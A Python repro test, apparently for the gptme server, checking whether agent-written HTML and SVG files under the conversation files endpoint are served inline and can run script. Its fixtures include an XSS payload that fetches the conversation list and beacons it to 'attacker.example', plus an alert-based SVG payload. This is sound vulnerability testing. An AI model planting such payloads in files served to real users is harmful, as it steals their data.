"""Repro: /api/v2/conversations/<id>/files/<path> serves agent-written .html/.svg
inline with an executable content type on the API (and bundled-webui) origin.
Run: GPTME_LOGS_HOME=$(mktemp -d) <python-with-flask> test_files_endpoint_html.py
"""
import os, sys, tempfile, pathlib
sys.path.insert(0, "/tmp/bob-scratch/8fc2/webui-review")  # import the checkout's gptme
logs = pathlib.Path(os.environ["GPTME_LOGS_HOME"])
conv = logs / "2026-11-24-xss-test"
conv.mkdir(parents=True)
(conv / "conversation.jsonl").write_text('{"role":"system","content":"hi","timestamp":"2026-11-24T00:00:00"}\n')
ws = conv / "workspace"; ws.mkdir()
(ws / "report.html").write_text("<script>fetch('/api/v2/conversations').then(r=>r.text()).then(t=>navigator.sendBeacon('https://attacker.example',t))</script>")
(ws / "chart.svg").write_text('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>')

import gptme
assert gptme.__file__.startswith("/tmp/bob-scratch/8fc2/webui-review"), gptme.__file__
from gptme.server import auth
auth._auth_enabled = True
auth.get_server_token = lambda: "tok"
from gptme.server.app import create_app
app = create_app()
c = app.test_client()
fails = 0
for name in ["workspace/report.html", "workspace/chart.svg"]:
    r = c.get(f"/api/v2/conversations/{conv.name}/files/{name}", headers={"Authorization": "Bearer tok"})
    ct = r.headers.get("Content-Type"); cd = r.headers.get("Content-Disposition"); csp = r.headers.get("Content-Security-Policy")
    print(name, r.status_code, "CT=", ct, "CD=", cd, "CSP=", csp, "nosniff=", r.headers.get("X-Content-Type-Options"))
    executable = ct and (ct.startswith("text/html") or ct.startswith("image/svg"))
    if r.status_code == 200 and executable and not (cd and cd.startswith("attachment")) and not (csp and "sandbox" in csp):
        print("  FAIL: served inline, executable type, no attachment/sandbox"); fails += 1
sys.exit(1 if fails else 0)
